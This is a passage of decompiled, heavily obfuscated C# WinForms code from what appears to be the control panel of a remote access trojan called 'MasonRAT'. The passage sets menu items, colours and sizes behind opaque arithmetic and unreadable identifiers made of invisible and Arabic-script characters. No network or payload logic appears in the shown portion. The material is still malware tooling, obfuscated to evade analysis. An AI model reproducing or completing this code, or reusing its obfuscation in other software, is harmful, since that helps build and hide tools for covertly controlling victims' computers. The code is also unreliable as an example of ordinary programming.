\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ -((-819622484 ^ -1596107250) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, 241529087 - 1768560646 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + ((-141421525 ^ -1399407571) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.SelectionForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.SeparatorColor = Color.FromArgb((-81111971 - (1364953664 | 1923101918) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ -((-2109475929 ^ -91055763) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), (1379070278 + (1940431350 | 1201322214) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 ^ (919203259 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 << 122537960 - (972143367 << 1541460691) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), (-1278547386 - -627089076 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - -((651458469 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.TextRenderingHint = TextRenderingHint.SystemDefault;
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.Size = new Size((1368409088 + 722655911 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 > ((1534565404 | 1766496543) - 1435205245 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) ? (2105003834 ^ (290934629 | 2104658330)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 : 1891504348 % 1749104892 - 142399194 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, 424);
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 170));
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 171);
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ.Size = new Size((-468689652 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + (-1313104946 - -1781794803 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, 28);
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 172);
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 173));
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 174);
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A.Size = new Size(((697340119 > 64492992 ? 378394492 : 504525989) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 > 836080610 - 699822212 % 657051474 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ? 1797975720 - 1797975459 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 : 1858428415 - 1858428219 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, 28);
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 175);
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 176 /*0xB0*/));
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 177);
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A.Size = new Size(((1899137268 ^ 847439456 << 1798599248) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ ~((1717404841 > 364805487 ? 1756198863 : -1953368812) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 28);
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 178);
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 179));
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 180);
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A.Size = new Size(((1667082198 ^ 781077574 >> 1630592530) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ (52716545 + 1614366896 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) % (1360279943 + (706082962 >> 1308501889) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 28);
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 181);
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 182));
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 183);
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁.Size = new Size(((-1637663334 ^ ~1104782359) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) - ((541418923 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 28);
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 184);
    ToolStripItemCollection dropDownItems1 = this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.DropDownItems;
    ToolStripItem[] toolStripItems2 = new ToolStripItem[(1371622970 > 951691821 ? 21312909 : 28417212) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - (1468671999 - (1035833106 >> 241712372) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) % ((72907751 > 2079724504 ? 321635134 : 241226351) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0];
    toolStripItems2[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ;
    toolStripItems2[1] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء;
    toolStripItems2[((2097651690 ^ -1533046875) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + ((1754327711 > 721890170 ? 644345779 : 859127705) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B;
    dropDownItems1.AddRange(toolStripItems2);
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 185));
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 186);
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.Size = new Size((942717250 + 1724140052 % 234580826 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 > 678012220 - 396629562 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 ? (-1680855457 ^ -1680855397) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 : 993774161 - 993773900 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, 28);
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 187);
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.BackColor = Color.FromArgb((2121262723 + (903979832 << 55884804) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + (2063346460 - 870851333 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) % (937197240 - 339631289 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), ((-626345998 ^ -275390756) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) - ((1386778854 ^ (68352130 | 1736901104)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, ((-1767784386 ^ 57563783 << 862678350) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ^ (24 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ.ForeColor = Color.White;
